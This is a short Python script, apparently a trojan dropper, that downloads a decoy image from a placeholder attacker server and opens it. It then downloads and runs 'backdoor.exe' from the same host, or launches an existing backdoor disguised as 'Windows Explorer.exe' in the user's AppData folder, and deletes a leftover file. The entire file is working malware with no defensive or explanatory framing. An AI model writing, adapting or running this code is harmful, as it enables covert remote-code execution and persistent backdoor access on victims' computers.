import requests
import subprocess
import os
import tempfile

def download(url):
    response = requests.get(url)
    name = url.split("/")
    name = name[len(name)-1]
    fobj = open(name, 'wb')
    fobj.write(response.content)
    fobj.close

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

download('http://<attack-server>:8000/image.png')
subprocess.Popen('image.png',shell=True)
#subprocess.Popen allows the following commands in the code to run as well

location = os.environ["appdata"]+"\\Windows Explorer.exe"
if not os.path.exists(location):
    download('http://<attack-server>:8000/backdoor.exe')
    subprocess.call('backdoor.exe',shell=True)
else:
    os.chdir(os.environ['appdata'])
    subprocess.call('Windows Explorer.exe',shell=True)

os.remove('car.jpg')
